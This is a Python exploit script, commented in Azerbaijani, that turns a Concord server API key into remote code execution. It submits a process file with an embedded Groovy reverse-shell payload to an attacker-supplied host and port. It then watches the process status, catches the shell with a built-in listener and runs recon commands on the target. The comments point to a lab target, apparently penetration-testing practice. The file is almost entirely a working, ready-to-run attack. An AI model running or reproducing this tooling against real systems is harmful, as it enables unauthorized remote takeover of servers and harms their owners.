#!/usr/bin/env python3
"""
Concord API-key -> Groovy RCE (avtomatik)
Browser/XSS/simulator lazim deyil. API key ile birbasa proses baslat,
status izle, reverse shell tut. Hamisi bir terminalda.

Istifade:
    python3 avto_apikey.py \
        --target http://192.168.163.132:8001 \
        --apikey <API_KEY> \
        --lhost 192.168.163.X \
        --lport 9000 \
        [--groovy 2.5.2]

Qeyd:
  - lhost = CONCORD HOST-un sene cata bildiyi interface. Cox vaxt lokal lab
    sebekesi (192.168.163.X), VPN (192.168.45.X) deyil. Sehv lhost = shell yox.
  - groovy default 2.5.2 (lab host-da kesli olma ehtimali yuksek). Resolve
    olmasa proses FAILED olur -> --groovy ile basqa version sina.
"""

import sys
import json
import socket
import argparse
import threading
import urllib.request
import urllib.error
import uuid
import time


# ------------------------------------------------------------------ payload
def build_yml(lhost, lport, groovy_ver):
    return f"""configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:{groovy_ver}"
flows:
  default:
    - script: groovy
      body: |
         String host = "{lhost}";
         int port = {lport};
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {{
             while (pi.available() > 0) so.write(pi.read());
             while (pe.available() > 0) so.write(pe.read());
             while (si.available() > 0) po.write(si.read());
             so.flush(); po.flush(); Thread.sleep(50);
             try {{ p.exitValue(); break; }} catch (Exception e) {{}}
         }}
         p.destroy(); s.close();
"""


# ------------------------------------------------------------- multipart POST
def post_process(target, apikey, yml_bytes):
    """POST /api/v1/process -- multipart/form-data, field 'concord.yml'."""
    boundary = "----concord" + uuid.uuid4().hex
    body = b""
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="concord.yml"; filename="concord.yml"\r\n'
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += yml_bytes + b"\r\n"
    body += f"--{boundary}--\r\n".encode()

    url = target.rstrip("/") + "/api/v1/process"
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Authorization", apikey)
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")

    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, str(e)


# ---------------------------------------------------------- process status / log
def get_status(target, apikey, instance_id):
    url = target.rstrip("/") + f"/api/v1/process/{instance_id}"
    req = urllib.request.Request(url, method="GET")
    req.add_header("Authorization", apikey)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode(errors="replace"))
            return data.get("status", "UNKNOWN")
    except Exception as e:
        return f"ERR({e})"


def fetch_log(target, apikey, instance_id):
    url = target.rstrip("/") + f"/api/v1/process/{instance_id}/log"
    req = urllib.request.Request(url, method="GET")
    req.add_header("Authorization", apikey)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode(errors="replace")
    except Exception as e:
        return f"(log alina bilmedi: {e})"


# ------------------------------------------------------------- shell handler
shell_event = threading.Event()

def shell_listener(lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", lport))
    s.listen(1)
    print(f"[*] Reverse shell listener : 0.0.0.0:{lport}")

    conn, addr = s.accept()
    shell_event.set()
    print(f"\n[+] SHELL TUTULDU <- {addr[0]}:{addr[1]}\n{'='*50}")

    def recv_loop():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
            except Exception:
                break
        print("\n[*] Shell baglandi.")

    threading.Thread(target=recv_loop, daemon=True).start()

    # avtomatik recon
    try:
        conn.sendall(b"id; hostname; whoami\n")
    except Exception:
        pass

    try:
        while True:
            cmd = input()
            conn.sendall((cmd + "\n").encode())
    except (KeyboardInterrupt, EOFError):
        conn.close()


# ------------------------------------------------------------------- monitor
def monitor_process(target, apikey, instance_id):
    """Shell gelene qeder prosesin statusunu izle; FAILED olsa log goster."""
    last = None
    for _ in range(60):  # ~60s
        if shell_event.is_set():
            return
        st = get_status(target, apikey, instance_id)
        if st != last:
            print(f"[*] Proses statusu: {st}")
            last = st
        if st in ("FAILED", "CANCELLED", "TIMED_OUT"):
            print(f"[!] Proses {st} oldu. Log:")
            print("-" * 50)
            print(fetch_log(target, apikey, instance_id)[:4000])
            print("-" * 50)
            print("[!] Cox guman groovy dependency resolve olmadi. "
                  "--groovy ile basqa version sina (2.5.2 / 2.5.8).")
            return
        if st == "FINISHED" and not shell_event.is_set():
            print("[!] Proses FINISHED amma shell gelmedi -> lhost/lport yoxla. Log:")
            print(fetch_log(target, apikey, instance_id)[:2000])
            return
        time.sleep(2)


# ---------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description="Concord API-key Groovy RCE")
    ap.add_argument("--target", required=True, help="http://CONCORD_HOST:8001")
    ap.add_argument("--apikey", required=True, help="Concord API key (Authorization header)")
    ap.add_argument("--lhost",  required=True, help="Concord-un sene cata bildiyi IP")
    ap.add_argument("--lport",  type=int, default=9000, help="Listener port (default 9000)")
    ap.add_argument("--groovy", default="2.5.2", help="Groovy version (default 2.5.2)")
    args = ap.parse_args()

    print(f"[*] Hedef        : {args.target}")
    print(f"[*] LHOST/LPORT  : {args.lhost}:{args.lport}")
    print(f"[*] Groovy       : {args.groovy}")
    print()

    # 1. listener-i ayri thread-de qaldir
    t = threading.Thread(target=shell_listener, args=(args.lport,), daemon=True)
    t.start()
    time.sleep(0.5)

    # 2. payload qur + POST et
    yml = build_yml(args.lhost, args.lport, args.groovy).encode()
    print("[*] Proses baslatilir (POST /api/v1/process)...")
    status, resp = post_process(args.target, args.apikey, yml)

    if status is None:
        print(f"[!] Request xetasi: {resp}")
        return
    print(f"[*] HTTP {status}")

    if status == 401:
        print("[!] 401 -> API key sehv ve ya format yanlisdir. "
              "Header 'Authorization: <key>' kimi gedir, prefiks olmadan.")
        return
    if status not in (200, 201):
        print(f"[!] Gozlenilmez cavab:\n{resp[:1000]}")
        return

    try:
        data = json.loads(resp)
        instance_id = data.get("instanceId")
        print(f"[+] instanceId : {instance_id}  (ok={data.get('ok')})")
    except Exception:
        print(f"[!] Cavab parse olunmadi:\n{resp[:1000]}")
        return

    # 3. statusu izle (shell gelene qeder / FAILED olana qeder)
    monitor_process(args.target, args.apikey, instance_id)

    # 4. shell tutulubsa interaktiv qal
    if shell_event.is_set():
        t.join()
    else:
        print("[*] Shell gelmedi. Yuxaridaki log/qeydlere bax.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Cixilir.")
